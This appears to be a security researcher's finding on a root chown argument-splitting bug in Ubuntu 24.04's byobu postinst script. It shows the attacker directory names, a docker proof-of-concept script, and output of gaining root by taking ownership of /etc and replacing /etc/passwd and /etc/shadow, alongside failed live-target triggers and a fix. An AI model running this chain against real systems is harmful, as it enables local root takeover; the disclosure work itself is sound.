# Negative: byobu postinst `/run/screen/S-*` whitespace chown

Date: 2026-05-17

Target: `ubuntu24-server-lpe-target`, stock Ubuntu 24.04.4 Server Docker target. Attacker: `uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)`.

Artifacts:

```text
pocs/byobu_postinst_screen_chown_probe.sh
logs/byobu-postinst-screen-chown.out
```

## Result

Not counted as a valid default-state LPE, but this is the strongest new primitive found in this pass.

`byobu.postinst` has a real root `chown` argument-splitting bug over attacker-controlled `/run/screen/S-*` directory names. If root runs `byobu.postinst configure`, uid1001 can cause root to `chown` a top-level path such as `/etc` to `attacker:attacker`, which is enough to obtain root. The live target does not currently provide an unprivileged trigger for that maintainer-script execution: the system is fully upgraded, and uid1001 cannot invoke dpkg reconfiguration or start the apt upgrade service.

## Default Proof

Packages from the live target:

```text
apt                  2.8.3
byobu                6.11-0ubuntu1
debconf              1.5.86ubuntu1
screen               4.9.1-1ubuntu1
unattended-upgrades  2.9.1+nmu4ubuntu1
```

Default timer/service state:

```text
apt-daily-upgrade.timer       enabled active
unattended-upgrades.service   enabled active
```

Default path state:

```text
/run/screen                         drwxrwxrwt root:utmp
/etc/byobu/socketdir                0644 root:root
/var/lib/dpkg/info/byobu.postinst   0755 root:root
/etc                                0755 root:root
/root                               0700 root:root
```

`/etc/byobu/socketdir` sets:

```sh
SOCKETDIR="/var/run/screen"
```

The live target currently has no package work pending:

```text
apt-get -s upgrade
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
```

## Vulnerable Code

`/var/lib/dpkg/info/byobu.postinst:35-49`:

```sh
touch_flag() {
    touch "$1" || true
    chown --reference $(dirname "$1") "$1" || true
    chmod 700 "$1" || true
}
[ -r "/etc/$PKG/socketdir" ] && . "/etc/$PKG/socketdir"
if [ -d "$SOCKETDIR" ]; then
    for d in "$SOCKETDIR"/S-*; do
        if [ -d "$d/$PKG" ]; then
            touch_flag "$d/$PKG/reload-required"
        elif [ -d "$d" ]; then
            touch_flag "$d/$PKG.reload-required"
        fi
    done
fi
```

The unquoted command substitution in line 37 splits `dirname` output. With attacker-created directories:

```text
/run/screen/S-byoburef
/run/screen/S-byoburef etc
```

root evaluates the old reload-flag path as:

```sh
chown --reference /run/screen/S-byoburef etc "/run/screen/S-byoburef etc/byobu.reload-required"
```

When the maintainer script runs from `/`, the extra operand `etc` is `/etc`.

## Trigger Attempts

Live target, as uid1001:

```text
mkdir -p /run/screen/S-byoburef "/run/screen/S-byoburef etc"
dpkg --configure byobu
  -> requested operation requires superuser privilege
dpkg-reconfigure -fnoninteractive byobu
  -> must be run as root
systemctl start apt-daily-upgrade.service
  -> Interactive authentication required
```

`/etc` remained `root:root` after the live-target trigger attempts.

## Full-Impact Proof In Disposable Clone

The destructive portion was run only in a disposable clone of the same stock image:

```sh
docker run --rm ubuntu24-server-default-lpe:20260516-standard bash -lc '
mkdir -p /run/screen
chmod 1777 /run/screen
runuser -u attacker -- mkdir -p /run/screen/S-byoburef "/run/screen/S-byoburef etc"
DEBIAN_FRONTEND=noninteractive /bin/sh /var/lib/dpkg/info/byobu.postinst configure
stat -Lc "%A %U:%G %n" /etc
'
```

Observed:

```text
BEFORE_ETC drwxr-xr-x root:root /etc
AFTER_ETC  drwxr-xr-x attacker:attacker /etc
```

After `/etc` became attacker-owned, uid1001 replaced `/etc/passwd` and `/etc/shadow` with a known `pwnroot` uid0 account and authenticated to it:

```text
uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
Password: uid=0(root) gid=0(root) groups=0(root)
ROOT_PROOF
-rw-r--r-- 1 root root 0 /root/byobu_postinst_screen_chown_root
```

## Why This Is Not Counted

The primitive is real and root-impacting, but the completion bar requires exploitability from the default package/config/service state by a normal non-sudo local user. In the live tested target:

```text
apt-get -s upgrade -> 0 upgraded
uid1001 cannot run dpkg --configure byobu
uid1001 cannot run dpkg-reconfigure byobu
uid1001 cannot start apt-daily-upgrade.service
```

The default apt/unattended-upgrades timers could make this exploitable during a future byobu configure/upgrade event, but that event is not present in the fully updated target state and is not attacker-triggerable here. Under the user's strict rules, this remains a non-counting upgrade-triggered LPE primitive, not a validated default-state LPE.

## Cleanup

The live probe removed:

```text
/run/screen/S-byoburef
/run/screen/S-byoburef etc
```

The root-impact chain ran in a `docker run --rm` clone. No live target account files, `/etc` ownership, or package state were modified.

## Why Scanners May Miss It

A generic maintainer-script scanner may flag unquoted command substitutions, but the exploitability here depends on combining a root postinst path, `/etc/byobu/socketdir`, sticky `/run/screen`, shell glob behavior, `dirname` output splitting, dpkg's maintainer-script working directory, and a top-level directory ownership consequence. Conversely, a scanner can overclaim it unless it also proves the default trigger state.

## Suggested Fix

Quote the reference path and terminate options:

```sh
touch_flag() {
    touch "$1" || true
    ref="$(dirname -- "$1")"
    chown --reference="$ref" -- "$1" || true
    chmod 700 -- "$1" || true
}
```

Ubuntu Security triage should also consider whether maintainer scripts should ignore `/run/screen/S-*` entries whose names contain whitespace or path metacharacters, since those entries are attacker-controlled in the stock Server state.
